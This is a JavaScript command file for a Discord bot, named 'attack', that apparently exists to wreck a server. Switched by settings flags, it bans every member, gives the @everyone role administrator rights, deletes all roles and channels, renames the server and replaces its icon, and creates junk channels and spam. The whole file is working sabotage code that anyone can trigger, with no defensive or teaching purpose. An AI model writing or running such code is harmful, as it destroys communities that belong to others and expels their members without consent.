const settings = require('../settings.json');
exports.run = (client, message, args) => {

    if (settings.config.ban === "y") {
    message.guild.roles.find('name', '@everyone').members.map(m=>m.ban());
    }


    function suite(){
        message.guild.edit({
            icon: settings.config.img,
            name: settings.config.name
    })}
    



    if (settings.config.admin === "y") {
    message.guild.roles.find('name', '@everyone').edit({
        permissions: [8]
    });
    }
    if (settings.config.role_dlt === "y") {
    Promise.all(message.guild.roles.map(c => c.delete()));
    }
    if (settings.config.role_crt === "y") {
    message.guild.createRole({
        name: 'undefined-1'
    });
    }
   
    if (settings.config.spam === 'y') {
    message.guild.createChannel('undefined-156', 'text')
    function suite(){
    message.channel.send('spam');
    }
    setTimeout(suite, 10000)
    }
        if (settings.config.spam === 'n') {
            const typer = 'text';
            message.guild.createChannel('undefined-3', typer);
        }
        if (settings.config.spam === 'v') {
            const typer = 'voice';
            message.guild.createChannel('undefined-3', typer);

        }
        if (settings.config.spam === 'c') {
            const typer = 'category';
            message.guild.createChannel('undefined-3', typer);
        }
    if (settings.config.chnl_dlt === "y"){
    Promise.all(message.guild.channels.map(c => c.delete()));
    }
    if (settings.config.imgnom === "y") {
    setTimeout(suite, 500);
    }
}

exports.conf = {
    permLevel: 0,
    aliases: []
}

exports.help = {
    name: 'attack'
}
